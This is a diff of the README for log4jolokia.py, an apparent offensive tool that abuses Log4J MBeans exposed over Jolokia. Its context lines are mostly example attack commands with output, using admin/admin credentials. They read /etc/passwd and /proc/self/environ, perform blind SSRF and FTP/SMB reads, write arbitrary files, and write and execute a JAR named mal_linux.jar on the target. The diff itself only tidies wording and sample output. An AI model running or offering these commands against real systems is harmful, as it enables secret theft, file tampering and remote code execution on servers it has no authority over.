@@ -8,7 +8,7 @@ Python3 implementation for leveraging and exploiting [Log4J](https://logging.apa
 
 Generic Help:
 ```
-usage: log4jolokia.py [-h] [-u [USER]] [-p [PASSWD]] [--proxy [PROXY]] [-H [HEADER]] -r [READ] {exec_jar,write_file,read_file} [{exec_jar,write_file,read_file} ...] target [target ...]
+usage: log4jolokia.py [-h] [-u [USER]] [-p [PASSWD]] [--proxy [PROXY]] [-H [HEADER]] {exec_jar,write_file,read_file} [{exec_jar,write_file,read_file} ...] target [target ...]
 
 positional arguments:
   {exec_jar,write_file,read_file}
@@ -64,7 +64,7 @@ Example commands:
 		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r ftp://test:test@127.0.0.1:22/test -u admin -p admin -H 'Origin: http://localhost'
 		-- SMB (Windows only):
 		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r file:////127.0.0.1/C/test -u admin -p admin -H 'Origin: http://localhost'
-		-- HTTP SSRF (Usually no output):
+		-- HTTP SSRF (Usually no output a.k.a. Blind SSRF):
 		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r 'http://127.0.0.1:80/test?test=test' -u admin -p admin -H 'Origin: http://localhost'
 ```
 
@@ -72,8 +72,8 @@ Example - Read "/etc/passwd":
 ```
 $ python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -r /etc/passwd
 [.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=21263314
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=76ed5528
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
 [.] Using mbean org.apache.logging.log4j2:type=21263314
 [.] Setting ConfigLocationUri to point to arbitrary location /etc/passwd
 [+] Successfully set ConfigLocationUri to "/etc/passwd" 
@@ -92,8 +92,8 @@ Example - Read "/proc/self/environ" (content contains non-prinatable chars (e.g.
 ```
 $ python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -r /proc/self/environ
 [.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=21263314
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=76ed5528
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
 [.] Using mbean org.apache.logging.log4j2:type=21263314
 [.] Setting ConfigLocationUri to point to arbitrary location /proc/self/environ
 [+] Successfully set ConfigLocationUri to "/proc/self/environ" 
@@ -133,8 +133,8 @@ Example - Write "test" to "/tmp/test":
 $ echo test > t.txt
 $ python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -lf t.txt -w /tmp/test --proxy http://127.0.0.1:8080
 [.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=21263314
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=76ed5528
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
 [.] Reading content from t.txt
 [.] Generating Log4J configuration
 [+] Generated Log4J XML configuration
@@ -149,8 +149,8 @@ Example - Write a file containing invalid XML characters to "/tmp/test2":
 ```
 $ python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -lf 00-ff.txt -w /tmp/test2
 [.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=21263314
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=76ed5528
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
 [.] Reading content from 00-ff.txt
 [.] Generating Log4J configuration
 [.] Invalid XML characters have been detected in the content
@@ -194,8 +194,8 @@ Example - Write and execute JAR file:
 ```
 $ python3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -j mal_linux.jar
 [.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=21263314
-[+] Found Log4J Mbean org.apache.logging.log4j2:type=org.apache.logging.log4j2:type=76ed5528
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
+[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
 
 [!!!] WARNING: You are about to write and execute the contents of "mal_linux.jar" on the target system. Make sure that:
 	- The JAR contains a valid JVM TI agent
